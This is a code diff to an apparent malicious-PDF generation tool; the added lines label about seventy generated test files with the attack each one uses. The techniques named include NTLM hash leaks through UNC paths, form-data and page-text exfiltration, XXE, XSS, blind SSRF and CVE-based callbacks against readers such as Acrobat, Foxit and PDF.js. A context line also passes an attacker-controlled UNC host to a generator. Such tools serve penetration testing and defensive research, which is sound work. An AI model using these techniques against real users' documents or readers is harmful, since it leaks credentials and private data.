@@ -4232,6 +4232,79 @@ def main():
 
     print("[+] Creating PDF files..")
 
+    pdf_descriptions = {
+        1: "CVE-2018-4993 - /GoToE action with UNC path (NTLM callback)",
+        1.1: "CVE-2018-4993 - /GoToE action with HTTPS URL",
+        2: "XFA form submission - XDP submit event exfiltrates form data",
+        3: "JavaScript injection - /OpenAction calls app.openDoc() on remote URL",
+        4: "CVE-2019-7089 - XFA external XSLT stylesheet (UNC callback)",
+        5: "PDF101 - /URI action triggers DNS/HTTP request",
+        6: "PDF101 - /Launch action with external URL",
+        7: "PDF101 - /GoToR remote PDF loading",
+        8: "PDF101 - /SubmitForm with HTML flags (form data leak)",
+        9: "PDF101 - /ImportData external data import",
+        10: "CVE-2017-10951 - Foxit this.getURL() JS callback",
+        11: "EICAR test file - anti-virus detection string",
+        12: "CVE-2014-8453 - XFA FormCalc Post() same-origin exfiltration",
+        13: "Request injection - XFA submit CRLF via textEncoding header",
+        14: "ImageMagick SVG/MSL polyglot - shell injection via authenticate attr",
+        15: "FormCalc Post() with custom headers - arbitrary header injection",
+        16: "GotoE with javascript: URI - browser XSS via <embed>/<object>",
+        17: "CVE-2014-8452 - XMLData.parse() XXE external entity",
+        18: "PortSwigger - unescaped parens inject duplicate /A JS action",
+        19: "PortSwigger - /AA /PV Screen annotation auto-fires JS on visible",
+        20: "PortSwigger - /AA /PC annotation fires JS on page close",
+        21: "PortSwigger - /SubmitForm Flags 256 exfiltrates entire PDF",
+        22: "PortSwigger - this.submitForm() with cSubmitAs PDF",
+        23: "PortSwigger - invisible /Btn widget covers page, JS on click",
+        24: "PortSwigger - /Tx widget submitForm() POST (blind SSRF)",
+        25: "PortSwigger - getPageNthWord() rendered text exfiltration",
+        26: "PortSwigger - /AA /E mouseover annotation JS trigger",
+        28: "PortSwigger - unescaped parens inject /URI URL hijacking",
+        29: "CVE-2024-4367 - Type1 FontMatrix breaks out of c.transform() (PDF.js)",
+        30: "PDF101 - external XObject stream /FS /URL silent page-render callback",
+        31: "PDF101 - /S /Thread action with remote FileSpec (Acrobat DC v26 works)",
+        32: "PDF101 - /Launch /Win /O /print forces remote fetch",
+        '33_1': "Acrobat JS - this.submitForm() form submission",
+        '33_2': "Acrobat JS - this.getURL() URL fetch",
+        '33_3': "Acrobat JS - app.launchURL() launch URL",
+        '33_4': "Acrobat JS - app.media.getURLData() media fetch",
+        '33_5': "Acrobat JS - SOAP.connect() SOAP connection",
+        '33_6': "Acrobat JS - SOAP.request() SOAP request",
+        '33_7': "Acrobat JS - this.importDataObject() data import",
+        '33_8': "Acrobat JS - app.openDoc() open document",
+        '33_9': "PDF.js/browser - fetch() Web API callback",
+        '33_10': "PDF.js/browser - XMLHttpRequest Web API callback",
+        '33_11': "PDF.js/browser - new Image() image request callback",
+        '33_12': "PDF.js/browser - WebSocket callback",
+        '33_13': "Adobe 0-day (Apr 2026) - RSS.addFeed() callback",
+        '33_14': "Adobe 0-day (Apr 2026) - util.readFileIntoStream() + SOAP.request() chain",
+        '33_15': "Adobe 0-day (Apr 2026) - base64 JS staged in /Tx /V, decoded via getField()",
+        '34_1': "UNC - image XObject with UNC path (NTLM via page render)",
+        '34_2': "UNC - /GoToR action with UNC FileSpec",
+        '34_3': "UNC - /Thread action with UNC FileSpec",
+        '34_4': "UNC - /URI action with UNC path",
+        '34_5': "UNC - this.submitForm() with UNC path",
+        '34_6': "UNC - this.getURL() with UNC path",
+        '34_7': "UNC - app.launchURL() with UNC path",
+        '34_8': "UNC - SOAP.connect() with UNC path",
+        '34_9': "UNC - app.openDoc() with UNC path",
+        35: "PDF101 - /Names /JavaScript catalog-level auto-execute trigger",
+        36: "CVE-2016-2175/2017-9096 - XXE in /Metadata XMP stream (PDFBox, iText)",
+        37: "CVE-2016-2175/2017-9096 - XXE in /AcroForm /XFA stream",
+        38: "CVE-2020-29075 - catalog /AA /WC /WS /DS silent DNS callback",
+        39: "CVE-2022-28244 - RichMedia annotation embedded HTML/JS (CSP bypass)",
+        40: "CVE-2018-5158 - /FunctionType 4 PostScript JS injection (PDF.js)",
+        41: "CVE-2018-20065 - /OpenAction /S /URI silent nav (PDFium/Chrome)",
+        42: "CVE-2025-66516 - OOB %xxe; param entity in XFA (Tika/Confluence/Jira)",
+        43: "CVE-2025-70401 - <img> in Text annotation /T field XSS (Apryse WebViewer)",
+        44: "CVE-2024-12426 - vnd.sun.star.expand: ${HOME} env leak (LibreOffice)",
+        45: "CVE-2025-59803 - OCG /AA /WP /DP triggers JS during signing (Foxit)",
+        46: "CVE-2026-25755 - jsPDF addJS() object injection + /AA /O auto-action",
+        47: "PDF 2.0 /AF Associated Files with embedded HTML/JS",
+        48: "XFA SOAP submit with initialize event (Acrobat XFA engine)",
+    }
+
     pdf_generators = {
         1: (create_malpdf, f'\\\\{host}\\test'),
         1.1: (create_malpdf, ensure_scheme(host)),
@@ -4317,6 +4390,11 @@ def main():
         else:
             name = f"test{num}{ext}"
         filename = output_dir / name
+        description = pdf_descriptions.get(num, "")
+        if description:
+            print(f"    [*] {name} - {description}")
+        else:
+            print(f"    [*] {name}")
         if content:
             func(filename, content)
         else:
